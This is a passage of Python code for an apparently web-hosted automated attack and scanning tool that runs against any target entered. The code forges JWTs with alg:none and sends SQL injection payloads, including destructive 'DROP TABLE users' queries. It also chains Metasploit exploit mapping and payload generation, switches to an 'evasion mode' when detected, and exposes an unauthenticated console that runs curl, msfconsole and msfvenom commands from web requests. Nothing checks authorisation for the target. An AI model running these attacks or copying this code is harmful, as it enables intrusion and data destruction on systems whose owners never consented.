                    new_jwt = f'eyJhbGciOiJub25lIn0=.{payload_b64}.'  # alg:none header
                    # Try sending modified JWT
                    test_cookies = requests.utils.dict_from_cookiejar(session.cookies)
                    test_cookies[jwt_cookie.name] = new_jwt
                    try:
                        test_res = session.get(base_url, cookies=test_cookies, timeout=5)
                        if test_res.status_code == 200:
                            add_finding('crit', f'JWT alg:none attack possible!', asset='JWT_ALG_NONE', tool='auth')
                            log('red', f'[AUTH] JWT alg:none attack confirmed!', tool='auth')
                            issues_found +=1
                    except:
                        pass
                
                # Test weak HMAC secrets
                weak_secrets = ['secret', 'password', 'key', '123456', 'admin']
                for secret in weak_secrets:
                    try:
                        # Just log for now, real verification would need signing
                        pass
                    except:
                        pass
            except Exception as e:
                log('yellow', f'[AUTH] JWT decode error: {str(e)}', tool='auth')
        
        # --- 2. CSRF Testing ---
        log('cyan', '[AUTH] Checking for CSRF tokens in forms...', tool='auth', progress=30)
        csrf_token_names = ['csrf_token', 'csrf', '_token', 'authenticity_token', '_csrf', 'token']
        forms = soup.find_all('form')
        for idx, form in enumerate(forms):
            found_csrf = False
            inputs = form.find_all('input')
            for inp in inputs:
                name = inp.get('name', '').lower()
                for csrf_name in csrf_token_names:
                    if csrf_name in name:
                        found_csrf = True
                        break
                if found_csrf:
                    break
            if not found_csrf and any(inp.get('type') in ['text', 'email', 'password'] for inp in inputs):
                add_finding('med', f'Form {idx+1} has no CSRF token!', asset=f'CSRF_Form{idx+1}', tool='auth')
                log('yellow', f'[AUTH] Form {idx+1} has no CSRF token!', tool='auth')
                issues_found +=1
        
        # --- 3. Rate Limiting Testing ---
        log('cyan', '[AUTH] Testing rate limiting on login endpoints...', tool='auth', progress=50)
        auth_endpoints = ['/login', '/signin', '/api/login', '/auth/login']
        login_url = None
        for endpoint in auth_endpoints:
            try:
                test_res = session.get(urljoin(base_url, endpoint), timeout=5)
                if test_res.status_code in [200, 405]:
                    login_url = urljoin(base_url, endpoint)
                    break
            except:
                pass
        
        if login_url:
            log('cyan', f'[AUTH] Testing rate limiting on {login_url}...', tool='auth')
            start = time.time()
            last_status = None
            blocked = False
            for i in range(20):
                try:
                    test_res = session.post(login_url, data={'username': 'test_user', 'password': 'test_pass'}, timeout=3)
                    if test_res.status_code in [429, 403]:
                        blocked = True
                        break
                    last_status = test_res.status_code
                except:
                    pass
            elapsed = time.time() - start
            if not blocked:
                add_finding('med', f'No rate limiting detected on login endpoint! Sent 20 requests in {elapsed:.1f}s', asset='NO_RATE_LIMIT', tool='auth')
                log('yellow', f'[AUTH] No rate limiting detected on login!', tool='auth')
                issues_found +=1
            else:
                log('green', f'[AUTH] Rate limiting detected (returned 429/403)!', tool='auth')
        
        # --- 4. Cookie Security Flags ---
        log('cyan', '[AUTH] Checking cookie security attributes...', tool='auth', progress=70)
        if 'Set-Cookie' in response.headers:
            for cookie in session.cookies:
                cookie_issues = []
                if not cookie.secure:
                    cookie_issues.append('Missing Secure flag')
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    cookie_issues.append('Missing HttpOnly flag')
                if not cookie.has_nonstandard_attr('SameSite'):
                    cookie_issues.append('Missing SameSite flag')
                if cookie_issues:
                    add_finding('med', f'Cookie "{cookie.name}" issues: {", ".join(cookie_issues)}', asset=f'COOKIE_{cookie.name}', tool='auth')
                    log('yellow', f'[AUTH] Cookie "{cookie.name}" has issues: {", ".join(cookie_issues)}', tool='auth')
                    issues_found +=1
        
        # --- 5. IDOR Testing ---
        log('cyan', '[AUTH] Checking for IDOR endpoints...', tool='auth', progress=85)
        params = crawl_for_parameters(target)
        numeric_params = [p for p in params if any(str(x) in p.lower() for x in ['id', 'user', 'account', 'order'])]
        for param in numeric_params:
            try:
                res1 = session.get(base_url, params={param: '1'}, timeout=5)
                res2 = session.get(base_url, params={param: '2'}, timeout=5)
                if len(res1.text) > 100 and len(res2.text) > 100 and res1.text != res2.text:
                    add_finding('med', f'Possible IDOR on param {param} (different responses for 1/2)', asset=f'IDOR_{param}', tool='auth')
                    log('yellow', f'[AUTH] Possible IDOR on param {param}!', tool='auth')
                    issues_found +=1
            except:
                pass
        
        log('green', f'[AUTH] Auth testing complete! Found {issues_found} issues!', tool='auth', progress=100)
    except Exception as e:
        log('red', f'[AUTH] Error: {str(e)}', tool='auth', progress=100)
        
def run_sqlmap_testing(target):
    """FULL Python-native SQL injection detector (no external binaries)"""
    if check_stop(): return
    log('cyan', f'[SQLI] Starting full Python-native SQLi testing...', tool='sqli', progress=0)
    issues_found = 0
    try:
        response, base_url = request_with_fallback(target, '/')
        session = requests.Session()
        session.headers.update(HTTP_HEADERS)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Crawl for GET params and HTML forms
        get_params = crawl_for_parameters(target)
        if not get_params:
            get_params = ['id', 'user', 'search', 'query', 'page', 'cat', 'item']
        
        forms = soup.find_all('form')
        log('cyan', f'[SQLI] Crawled: {len(get_params)} GET params, {len(forms)} HTML forms', tool='sqli', progress=20)
        
        # SQLi payload library
        sqli_tests = {
            'error-based': [
                ("'", "Single quote"),
                ('"', "Double quote"),
                ("')", "Single quote + close parenthesis"),
                ('")', "Double quote + close parenthesis"),
                ("';", "Single quote + semicolon"),
                ('";', "Double quote + semicolon")
            ],
            'boolean-blind': [
                ("' AND 1=1--", "True condition"),
                ("' AND 1=0--", "False condition"),
                ('" AND 1=1--', "True condition (double quote)"),
                ('" AND 1=0--', "False condition (double quote)")
            ],
            'union-based': [
                ("' UNION SELECT NULL--", "Single NULL"),
                ("' UNION SELECT NULL,NULL--", "Two NULLs"),
                ("' UNION SELECT 1,2,3--", "Three numbers"),
                ("' UNION SELECT 'test1','test2'--", "Two strings"),
                ('" UNION SELECT NULL--', "Single NULL (double quote)"),
                ('" UNION SELECT NULL,NULL--', "Two NULLs (double quote)")
            ],
            'time-blind': [
                ("' AND SLEEP(5)--", "MySQL sleep"),
                ('" AND SLEEP(5)--', "MySQL sleep (double quote)"),
                ("'; WAITFOR DELAY '0:0:5'--", "MSSQL waitfor"),
                ('"; WAITFOR DELAY "0:0:5"--', "MSSQL waitfor (double quote)"),
                ("' AND pg_sleep(5)--", "PostgreSQL pg_sleep"),
                ('" AND pg_sleep(5)--', "PostgreSQL pg_sleep (double quote)")
            ],
            'stacked': [
                ("'; DROP TABLE users--", "Drop table"),
                ('"; DROP TABLE users--', "Drop table (double quote)"),
                ("'; SELECT * FROM users--", "Select all")
            ]
        }
        
        error_signatures = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL', 'SQLite', 'MariaDB',
            'unclosed quotation mark', 'quoted string not properly terminated',
            'supplied argument is not a valid MySQL', 'Warning: mysql_'
        ]
        
        # Test GET parameters
        for param in get_params:
            if check_stop(): break
            log('cyan', f'[SQLI] Testing GET param: {param}', tool='sqli', progress=40)
            
            # Error-based testing
            for payload, desc in sqli_tests['error-based']:
                try:
                    res = session.get(base_url, params={param: payload}, timeout=8)
                    for sig in error_signatures:
                        if sig.lower() in res.text.lower():
                            add_finding('high', f'Error-based SQLi: ?{param}={payload} (signature: {sig})', asset=f'SQLi_Error_{param}', tool='sqli')
                            log('red', f'[SQLI] Error-based SQLi confirmed on {param}!', tool='sqli')
                            issues_found +=1
                            break
                    random_delay(0.2, 0.4)
                except:
                    pass
            
            # Boolean-blind testing
            try:
                res_true = session.get(base_url, params={param: sqli_tests['boolean-blind'][0][0]}, timeout=8)
                res_false = session.get(base_url, params={param: sqli_tests['boolean-blind'][1][0]}, timeout=8)
                if len(res_true.text) != len(res_false.text) and abs(len(res_true.text) - len(res_false.text)) > 100:
                    add_finding('med', f'Boolean-blind SQLi candidate on ?{param}', asset=f'SQLi_Boolean_{param}', tool='sqli')
                    log('yellow', f'[SQLI] Boolean-blind SQLi candidate on {param}!', tool='sqli')
                    issues_found +=1
                random_delay(0.2, 0.4)
            except:
                pass
            
            # Time-based testing
            for payload, desc in sqli_tests['time-blind']:
                try:
                    start = time.time()
                    session.get(base_url, params={param: payload}, timeout=12)
                    elapsed = time.time() - start
                    if elapsed > 4:
                        add_finding('high', f'Time-based blind SQLi: ?{param}={payload} (delay: {elapsed:.1f}s)', asset=f'SQLi_Time_{param}', tool='sqli')
                        log('red', f'[SQLI] Time-based SQLi confirmed on {param}!', tool='sqli')
                        issues_found +=1
                        break
                    random_delay(0.2, 0.4)
                except:
                    pass
        
        # Test HTML forms (POST params)
        for idx, form in enumerate(forms):
            if check_stop(): break
            log('cyan', f'[SQLI] Testing form {idx+1}', tool='sqli', progress=70)
            form_action = form.get('action', '/')
            form_method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            form_params = []
            for inp in inputs:
                name = inp.get('name')
                if name:
                    form_params.append(name)
            
            if not form_params:
                continue
                
            form_url = urljoin(base_url, form_action)
            for param in form_params:
                # Error-based on POST params
                for payload, desc in sqli_tests['error-based']:
                    try:
                        data = {param: payload}
                        for other_param in form_params:
                            if other_param != param:
                                data[other_param] = 'test'
                        if form_method == 'post':
                            res = session.post(form_url, data=data, timeout=8)
                        else:
                            res = session.get(form_url, params=data, timeout=8)
                        for sig in error_signatures:
                            if sig.lower() in res.text.lower():
                                add_finding('high', f'Error-based SQLi (form {idx+1}): param={param} payload={payload}', asset=f'SQLi_Error_Form{idx+1}_{param}', tool='sqli')
                                log('red', f'[SQLI] Error-based SQLi confirmed on form {idx+1} param {param}!', tool='sqli')
                                issues_found +=1
                                break
                        random_delay(0.2, 0.4)
                    except:
                        pass
        
        log('green', f'[SQLI] SQLi testing complete! Found {issues_found} issues!', tool='sqli', progress=100)
    except Exception as e:
        log('red', f'[SQLI] Error: {str(e)}', tool='sqli', progress=100)

def run_trufflehog(target):
    """Secret scanning using trufflehog (on local files if available, or scan URLs)"""
    if check_stop(): return
    log('cyan', f'[TRUFFLEHOG] Starting secret scan...', tool='trufflehog', progress=0)
    try:
        log('yellow', '[TRUFFLEHOG] Note: TruffleHog is mainly for git repos, skipping URL scan for safety', tool='trufflehog', progress=100)
    except Exception as e:
        log('yellow', f'[TRUFFLEHOG] Error: {e}', tool='trufflehog', progress=100)

def run_vuln_validation(finding):
    """GOD LEVEL: Actually verify if a detected vulnerability is exploitable (Safely)"""
    if 'VULN_PATH' in finding.get('asset', ''):
        path = finding['asset'].split(': ')[1]
        target = scan_state.get('target')
        log('red', f'[VALIDATOR] Verifying exploitability of {path}...', tool='system')
        
        try:
            # Safe verification: Check for specific secret patterns in the exposed file
            res = requests.get(f"http://{target}{path}", timeout=5, headers=HTTP_HEADERS)
            if res.status_code == 200:
                content = res.text
                secrets = ['AWS_ACCESS_KEY', 'PASSWORD', 'SECRET_KEY', 'DATABASE_URL']
                found_secrets = [s for s in secrets if s in content.upper()]
                
                if found_secrets:
                    msg = f"VULNERABILITY VERIFIED: {path} is publicly accessible and contains sensitive keys: {', '.join(found_secrets)}"
                    add_finding('crit', msg, asset=finding['asset'], tool='validator', impact='confidentiality', exploitability='active')
                    log('red', f'[!] {msg}')
                    return True
        except:
            pass
    return False

def analyze_with_ai(context_data):
    """GOD LEVEL: Intelligence synthesis with Kill Chain Prediction"""
    log('cyan', '[GOD-LEVEL] Synthesizing all data points for Kill Chain Prediction...', thought='exploit')
    
    findings = scan_state.get('findings_list', [])
    if not findings:
        return "Intelligence synthesis complete: No actionable attack vectors identified."

    # Kill Chain Mapping
    recon_data = [f for f in findings if f['tool'] in ['nmap', 'shodan', 'passive']]
    vuln_data = [f for f in findings if f['tool'] in ['nuclei', 'nikto', 'xss']]
    exploit_data = [f for f in findings if f['tool'] in ['metasploit', 'exploit_db']]
    
    log('purple', f'[AI-SYNTHESIS] Correlating {len(recon_data)} assets, {len(vuln_data)} vulnerabilities, and {len(exploit_data)} exploit modules.')

    # Logic: Attack Vector Synthesis
    attack_vectors = []
    
    # Vector 1: Web-to-Internal Pivot
    if vuln_data and any(p in str(f.get('asset')) for f in recon_data for p in ['3306', '6379', '5432']):
        vector = "ATTACK VECTOR IDENTIFIED: Web-to-Internal Pivot. Public web vulnerability can be used to tunnel into exposed internal database services."
        attack_vectors.append(vector)
        add_finding('crit', f"KILL-CHAIN: {vector}", tool='AI_SYNTHESIS', impact='confidentiality', exploitability='active')

    # Vector 2: Credential Stuffing / Brute Force
    if any('ssh' in str(f.get('asset')).lower() or 'ftp' in str(f.get('asset')).lower() for f in recon_data):
        vector = "ATTACK VECTOR IDENTIFIED: Credential Exhaustion. Open authentication services detected without MFA headers."
        attack_vectors.append(vector)
        add_finding('high', f"KILL-CHAIN: {vector}", tool='AI_SYNTHESIS', impact='integrity', exploitability='public')

    # Tactical Remediation Advice
    for vector in attack_vectors:
        log('red', f'[GOD-LEVEL ALERT] {vector}')

    # Final Summary for PDF
    log('green', '[GOD-LEVEL] Intelligence report ready for generation.')
    return "Synthesis Complete."

def run_full_scan(target):
    """GOD-LEVEL: High-speed parallelized scan pipeline"""
    target = normalize_target(target)
    if not target:
        scan_state['status'] = 'COMPLETE'
        log('red', '[System] Invalid target provided; scan aborted.')
        return
    scan_state['target'] = target
    scan_state['status'] = 'RUNNING'
    scan_state['progress'] = {k: 0 for k in scan_state['tools'].keys()}
    scan_state['findings'] = {'crit': 0, 'high': 0, 'med': 0, 'low': 0}
    scan_state['findings_list'] = []
    scan_state['discovered_assets'] = set()
    
    log('cyan', f'[System] Starting high-speed parallel offensive recon on {target}...')
    # Add to history if not already there
    if target not in scan_state['target_history']:
        scan_state['target_history'].insert(0, target)
        if len(scan_state['target_history']) > 10:
            scan_state['target_history'].pop()

    try:
        # Phase 1: Parallel Passive Recon & OSINT
        log('cyan', '[AI] Starting parallel Passive Recon & OSINT phase...', thought='passive')
        passive_tasks = [
            lambda: run_whois_enum(target),
            lambda: run_dns_deep_enum(target),
            lambda: run_subdomain_enum(target),
            lambda: run_cloud_recon(target),
            lambda: run_tech_stack_detection(target),
            lambda: run_shodan_lookup(target),
            lambda: run_virustotal_lookup(target),
            lambda: run_wayback_lookup(target),
            lambda: run_cve_lookup(target),
            lambda: run_google_dorking(target),
            lambda: run_crawling(target),
            lambda: run_advanced_fingerprinting(target),
            lambda: run_subfinder(target),
            lambda: run_amass(target),
            lambda: run_gau(target),
            lambda: run_waybackurls(target)
        ]
        
        with ThreadPoolExecutor(max_workers=len(passive_tasks)) as executor:
            futures = [executor.submit(t) for t in passive_tasks]
            for future in as_completed(futures):
                if check_stop(): break
                future.result()
         # ===== MYTHOS AUTONOMOUS DEEP SCAN (ADD YAHI PE) =====
        if not check_stop():
            log('purple', '[SYSTEM] Starting Mythos Autonomous Deep Scan...')
            mythos_report = run_mythos_autonomous_scan(target)
            if mythos_report and mythos_report.get('confirmed_findings'):
                log('green', f'[MYTHOS] Found {len(mythos_report["confirmed_findings"])} additional vulns!')
                for f in mythos_report['confirmed_findings']:
                    log('red', f'  ✅ {f["type"]} - {f.get("evidence", "")[:80]}')       
        
        if check_stop(): return

        # Phase 2: Active Recon (Run port scans in parallel!
        log('cyan', '[AI] Starting Active Scanning phase...', thought='active')
        
        open_ports = []
        
        def run_nmap_and_get_ports():
            return run_nmap_scan(target)
            
        def run_naabu_and_get_ports():
            return run_naabu(target)
            
        with ThreadPoolExecutor(max_workers=2) as executor:
            future_nmap = executor.submit(run_nmap_and_get_ports)
            future_naabu = executor.submit(run_naabu_and_get_ports)
            future_httpx = executor.submit(run_httpx, target)
            open_ports_nmap = future_nmap.result()
            open_ports_naabu = future_naabu.result()
            open_ports = list(set(open_ports_nmap + open_ports_naabu))
        
        if check_stop(): return

        # Phase 3 & 4: Parallel Service Audits & Web Scans
        log('cyan', '[AI] Starting parallel Service Deep-Dive & Web Audit...', thought='web')
        active_tasks = [
            lambda: run_service_deep_dive(target, open_ports),
            lambda: run_nikto_scan(target),
            lambda: run_fuzzing_engine(target),
            lambda: run_xss_scan(target),
            lambda: run_nuclei_scan(target),
            lambda: run_adaptive_method_scan(target),
            lambda: run_gobuster(target),
            lambda: run_ffuf(target),
            lambda: run_katana(target),
            lambda: run_arjun(target),
            lambda: run_dalfox(target),
            lambda: run_wpscan(target),
            lambda: run_jsubfinder(target),
            lambda: run_ssrf_testing(target),
            lambda: run_lfi_testing(target),
            lambda: run_ssti_testing(target),
            lambda: run_xxe_testing(target),
            lambda: run_auth_testing(target),
            lambda: run_sqlmap_testing(target)
        ]
        
        with ThreadPoolExecutor(max_workers=len(active_tasks)) as executor:
            futures = [executor.submit(t) for t in active_tasks]
            for future in as_completed(futures):
                if check_stop(): break
                future.result()
          

        if check_stop(): return

        # Phase 5: Exploit Mapping & Data Leakage
        log('cyan', '[AI] Finalizing Exploit Mapping & Data Leakage...', thought='exploit')
        
        def run_exploit_chain():
            exps = run_metasploit_scan(target)
            if not check_stop():
                run_payload_generation(target, exps)
        
        exploit_tasks = [
            run_exploit_chain,
            lambda: run_data_leakage_scan(target)
        ]
        
        with ThreadPoolExecutor(max_workers=len(exploit_tasks)) as executor:
            futures = [executor.submit(t) for t in exploit_tasks]
            for future in as_completed(futures):
                if check_stop(): break
                future.result()
        # ===== MYTHOS AUTONOMOUS DEEP SCAN =====
        if not check_stop():
            log('purple', '[SYSTEM] Starting Mythos Autonomous Deep Scan...')
            mythos_report = run_mythos_autonomous_scan(target)
            if mythos_report and mythos_report.get('confirmed_findings'):
                log('green', f'[MYTHOS] Found {len(mythos_report["confirmed_findings"])} additional vulns!')
                for f in mythos_report['confirmed_findings']:
                    log('red', f'  ✅ {f["type"]} - {f.get("evidence", "")[:80]}')
            if mythos_report and mythos_report.get('attack_chains'):
                log('yellow', f'[MYTHOS] Built {len(mythos_report["attack_chains"])} attack chains!')

        # Phase 6: GOD LEVEL - Tactical Analysis & Validation
        if check_stop(): return
        log('purple', '[GOD-LEVEL] Starting tactical exploitability analysis...', thought='exploit')
        
        # Auto-validate high-priority findings in parallel
        findings = scan_state.get('findings_list', [])
        high_findings = [f for f in findings if f.get('severity') in ['HIGH', 'CRITICAL']]
        
        if high_findings:
            with ThreadPoolExecutor(max_workers=5) as executor:
                [executor.submit(run_vuln_validation, f) for f in high_findings]
                
        # Final AI Tactical Assessment & Kill Chain Prediction
        analyze_with_ai(target)
        
        # Ollama Fallback if no critical vulnerabilities found
        total_high_crit = scan_state['findings']['crit'] + scan_state['findings']['high']
        if total_high_crit == 0:
            log('purple', '[OLLAMA] No critical vulnerabilities found. Asking AI for manual exploitation guidance...')
            ollama_prompt = f"The automated scan for {target} found no critical vulnerabilities. Here is the discovered tech stack: {scan_state['tech_stack']}. What manual steps should a penetration tester take now to find hidden bugs or vulnerabilities? Provide a detailed guide."
            ollama_guidance = ask_ollama(ollama_prompt)
            if ollama_guidance:
                scan_state['ollama_insights'].append({"tool": "General Guidance", "guidance": ollama_guidance})
                log('green', '[OLLAMA] AI Guidance received. Check the Ollama Terminal for details.')

        log('green', '[GOD-LEVEL] Intelligence synthesis complete.', thought='exploit', progress=100)
    except Exception as e:
        log('red', f'[System] Scan pipeline error: {e}')
    finally:
        if scan_state['status'] != 'STOPPED':
            scan_state['status'] = 'COMPLETE'
            log('green', f'[+] Full scan complete. Target: {target}')
        else:
            log('yellow', f'[!] Scan stopped by user. Final results compiled for: {target}')
            
        total_findings = sum(scan_state["findings"].values())
        log('green', f'[+] Total Findings: {total_findings} (Crit: {scan_state["findings"]["crit"]}, High: {scan_state["findings"]["high"]}, Med: {scan_state["findings"]["med"]}, Low: {scan_state["findings"]["low"]})')
        log('green', f'[+] Assets Discovered: {len(scan_state["discovered_assets"])}')

@app.route('/download_report')
def download_report():
    """Download the generated HTML report"""
    target = scan_state.get('target', 'scan')
    report_path = generate_html_report(target)
    return send_from_directory(BASE_DIR, os.path.basename(report_path), as_attachment=True)

@app.route('/exploit_console', methods=['POST'])
def exploit_console():
    """Execute a manual exploit command (Authorized ONLY)"""
    data = request.json
    cmd = data.get('cmd', '')
    
    if not cmd:
        return jsonify({'error': 'No command provided'}), 400
        
    # Safety: Only allow specific safe tools for the console
    allowed_tools = ['curl', 'msfconsole', 'msfvenom', 'nmap', 'nuclei']
    tool = cmd.split(' ')[0]
    if tool not in allowed_tools:
        return jsonify({'error': f'Tool {tool} is not permitted in the web console for safety.'}), 403
        
    try:
        # Run the manual command
        process = subprocess.run(cmd.split(' '), capture_output=True, text=True, timeout=30)
        return jsonify({
            'stdout': process.stdout,
            'stderr': process.stderr,
            'exit_code': process.returncode
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/status')
def status():
    """Return current scan status"""
    return jsonify({
        'status': scan_state['status'],
        'target': scan_state['target'],
        'progress': scan_state['progress'],
        'findings': scan_state['findings'],
        'assets_count': len(scan_state['discovered_assets'])
    })

@app.route('/')
def index():
    """Serve frontend UI"""
    return send_from_directory(BASE_DIR, 'vulnscan.html')

@app.route('/vulnscan.html')
def frontend_html():
    """Serve frontend UI file directly"""
    return send_from_directory(BASE_DIR, 'vulnscan.html')

@app.route('/health')
def health():
    """Self-ping endpoint to keep the service awake"""
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

def self_ping():
    """Thread function to ping self every 10 minutes to prevent Render sleep"""
    # Wait for server to start
    time.sleep(30)
    while True:
        try:
            # Check if we are running on Render (Render sets the RENDER_EXTERNAL_URL env var)
            url = os.environ.get('RENDER_EXTERNAL_URL')
            if url:
                health_url = f"{url.rstrip('/')}/health"
                logger.info(f"Self-pinging: {health_url}")
                requests.get(health_url, timeout=10)
            else:
                logger.info("Not running on Render, self-ping skipped.")
        except Exception as e:
            logger.error(f"Self-ping failed: {e}")
        
        # Sleep for 10 minutes (600 seconds)
        time.sleep(600)

@app.route('/logs')
def get_logs():
    """Return accumulated logs"""
    return jsonify(get_all_logs())

@app.route('/stop_scan', methods=['POST'])
def stop_scan():
    """Request to stop the current scan"""
    scan_state['stop_requested'] = True
    if scan_state['active_process']:
        try:
            scan_state['active_process'].terminate()
            log('red', '[System] Active process terminated.')
        except:
            pass
    scan_state['status'] = 'STOPPED'
    return jsonify({'status': 'STOPPING'})

@app.route('/start_scan', methods=['POST'])
def start_scan():
    """Start a new scan"""
    data = request.json
    target = data.get('target', '')
    lang = data.get('lang', 'en')
    
    if not target:
        return jsonify({'error': 'No target provided'}), 400
    
    # Reset state before new scan
    reset_scan_state()
    scan_state['lang'] = lang
    
    # Run scan in background thread
    thread = threading.Thread(target=run_full_scan, args=(target,))
    thread.start()
    
    return jsonify({'status': 'STARTED', 'target': target, 'lang': lang})

@app.route('/findings_details', methods=['GET'])
def get_findings_details():
    """Endpoint for the frontend to fetch full findings for PDF report"""
    return jsonify(scan_state['findings_list'])

@app.route('/assets')
def get_assets():
    """Return discovered assets"""
    return jsonify(list(scan_state['discovered_assets']))

@app.route('/history')
def get_history():
    """Return history of scanned targets"""
    return jsonify(scan_state['target_history'])

# Start self-pinging thread for Render (works with both app.run() and gunicorn)
ping_thread = threading.Thread(target=self_ping, daemon=True)
ping_thread.start()
# ============================================================================
# CLAUD MYTHOS INSPIRED - AUTONOMOUS SELF-HEALING DEEP SCAN ENGINE
# Features:
#   - Recursive Self-Correction (retry with adjusted params on failure)
#   - Autonomous Vulnerability Discovery (hypothesis → test → validate)
#   - Multi-Vector Chaining (combine findings for deeper exploits)
#   - Self-Healing on errors (detect failure mode, fix, retry)
#   - Deep Reasoning with Kill Chain Mapping
# Paste this entire block into your app.py
# ============================================================================

import traceback
import random
import html
import sqlite3
import ftplib
import telnetlib
from smtplib import SMTP
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
from collections import OrderedDict

# ---------------------------------------------------------------------------
# SECTION 1: SELF-HEALING DECORATOR & RETRY ENGINE
# ---------------------------------------------------------------------------

class ScanError(Exception):
    """Base exception for scan failures"""
    pass

class NetworkError(ScanError):
    """Network connectivity failure"""
    pass

class TimeoutError_(ScanError):
    """Operation timed out"""
    pass

class PayloadError(ScanError):
    """Payload generation or delivery failed"""
    pass

class ResourceExhaustion(ScanError):
    """Out of memory/threads/sockets"""
    pass

class DetectionError(ScanError):
    """Anti-virus/IDS blocked the scan"""
    pass

ERROR_HEALING_MAP = {
    NetworkError: {
        'fix': 'reduce_concurrency',
        'message': 'Network error detected. Reducing thread count and retrying...'
    },
    TimeoutError_: {
        'fix': 'increase_timeout',
        'message': 'Timeout detected. Increasing timeout value and retrying...'
    },
    PayloadError: {
        'fix': 'alternate_payload',
        'message': 'Payload failed. Trying alternate encoding...'
    },
    ResourceExhaustion: {
        'fix': 'clear_resources',
        'message': 'Resource exhaustion. Clearing cached data and retrying...'
    },
    DetectionError: {
        'fix': 'evasion_mode',
        'message': 'Possible detection. Switching to evasive scan profile...'
    }
}

# Global healing state
healing_state = {
    'concurrency': 15,
    'timeout': 10,
    'payload_style': 'standard',
    'evasion': False,
    'delays': False,
    'healing_attempts': 0,
    'max_healing_attempts': 5,
    'healing_history': []
}

def self_healing(max_retries=3):
    """Decorator that automatically detects failure types and self-heals"""
    def decorator(func):
        def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(max_retries + 1):
                try:
                    return func(*args, **kwargs)
                except ScanError as e:
                    last_exception = e
                    error_type = type(e)
                    healing_attempts = healing_state['healing_attempts']
                    if healing_attempts >= healing_state['max_healing_attempts']:
                        log('red', f'[MYTHOS-HEAL] Max healing attempts ({healing_attempts}) reached. Giving up on {func.__name__}.')
                        break
                    
                    healing_info = ERROR_HEALING_MAP.get(error_type)
                    if healing_info:
                        fix = healing_info['fix']
                        msg = healing_info['message']
                        healing_state['healing_attempts'] += 1
                        healing_state['healing_history'].append({
                            'function': func.__name__,
                            'error': str(e),
                            'fix': fix,
                            'attempt': attempt + 1,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        log('yellow', f'[MYTHOS-HEAL] [{healing_state["healing_attempts"]}/{healing_state["max_healing_attempts"]}] {msg}')
                        apply_healing_fix(fix)
                        
                        if attempt < max_retries:
                            log('cyan', f'[MYTHOS-HEAL] Retrying {func.__name__} (attempt {attempt + 2}/{max_retries + 1})...')
                            time.sleep(1 * (attempt + 1))
                    else:
                        # Unknown error type, try generic retry
                        log('yellow', f'[MYTHOS-HEAL] Unknown error: {str(e)}. Retrying ({attempt + 1}/{max_retries})...')
                        time.sleep(2)
                except Exception as e:
                    last_exception = e
                    log('yellow', f'[MYTHOS-HEAL] Unexpected error in {func.__name__}: {str(e)}. Retrying ({attempt + 1}/{max_retries})...')
                    time.sleep(2)
            
            log('red', f'[MYTHOS-HEAL] Function {func.__name__} failed after {max_retries + 1} attempts.')
            return None
        return wrapper
    return decorator

def apply_healing_fix(fix_name):
    """Apply a healing fix by adjusting global scan parameters"""
    if fix_name == 'reduce_concurrency':
        healing_state['concurrency'] = max(3, healing_state['concurrency'] - 3)
        log('cyan', f'[MYTHOS-HEAL] Concurrency reduced to {healing_state["concurrency"]}')
    elif fix_name == 'increase_timeout':
        healing_state['timeout'] = min(60, healing_state['timeout'] + 5)
        log('cyan', f'[MYTHOS-HEAL] Timeout increased to {healing_state["timeout"]}s')
    elif fix_name == 'alternate_payload':
        styles = ['standard', 'url_encoded', 'double_encoded', 'unicode', 'mixed_case']
        current = healing_state['payload_style']
        available = [s for s in styles if s != current]
        healing_state['payload_style'] = random.choice(available) if available else 'standard'
        log('cyan', f'[MYTHOS-HEAL] Payload style switched to: {healing_state["payload_style"]}')
    elif fix_name == 'clear_resources':
        import gc
        gc.collect()
        healing_state['concurrency'] = max(3, healing_state['concurrency'] - 5)
        log('cyan', '[MYTHOS-HEAL] Resources cleared, concurrency reduced.')
    elif fix_name == 'evasion_mode':
        healing_state['evasion'] = True
        healing_state['delays'] = True
        healing_state['concurrency'] = max(3, healing_state['concurrency'] - 5)
        log('cyan', '[MYTHOS-HEAL] Evasion mode activated. Delays added, concurrency reduced.')

def get_scan_params():
    """Get current scan parameters (factoring in healing state)"""
    params = {
        'timeout': healing_state['timeout'],
        'concurrency': healing_state['concurrency'],
        'evasion': healing_state['evasion'],
        'delays': healing_state['delays'],
        'payload_style': healing_state['payload_style']
    }
    return params

# ---------------------------------------------------------------------------
# SECTION 2: CLAUD MYTHOS CORE ENGINE - AUTONOMOUS HYPOTHESIS TESTING
# ---------------------------------------------------------------------------

class MythosEngine:
    """
    Autonomous penetration testing engine inspired by Claud Mythos.
    
    Core Loop:
    1. OBSERVE - Collect intelligence about target
    2. HYPOTHESIZE - Generate attack hypotheses based on observations
    3. TEST - Execute targeted tests for each hypothesis
    4. ANALYZE - Evaluate results, confirm/refute hypotheses
    5. CHAIN - Link confirmed findings into attack chains
    6. PIVOT - Use confirmed access to reach deeper targets
    7. SELF-HEAL - Detect failures and adapt
    """
    
    def __init__(self, target):
        self.target = normalize_target(target)
        self.session = requests.Session()
        self.session.headers.update(HTTP_HEADERS)
        self.base_url = None
        self.findings = []
        self.hypotheses = []
        self.confirmed = []
        self.attack_chains = []
        self.observations = {}
        self.pivot_targets = []
        self.running = True
        self.intel_report = {}
        
    def stop(self):
        self.running = False
        
    @self_healing(max_retries=3)
    def observe(self):
        """Phase 1: Deep observation of the target"""
        log('purple', f'[MYTHOS-ENGINE] [OBSERVE] Beginning deep observation of {self.target}...')
        params = get_scan_params()
        
        # Connect and fingerprint
        try:
            response, self.base_url = request_with_fallback(
                self.target, '/', timeout=params['timeout']
            )
            self.observations['status_code'] = response.status_code
            self.observations['headers'] = dict(response.headers)
            self.observations['content_length'] = len(response.text or '')
            
            soup = BeautifulSoup(response.text or '', 'html.parser')
            self.observations['forms'] = len(soup.find_all('form'))
            self.observations['scripts'] = len(soup.find_all('script'))
            self.observations['links'] = len(soup.find_all('a', href=True))
            self.observations['inputs'] = len(soup.find_all('input'))
            
            # Extract parameters from forms and URLs
            params_set = set()
            for form in soup.find_all('form'):
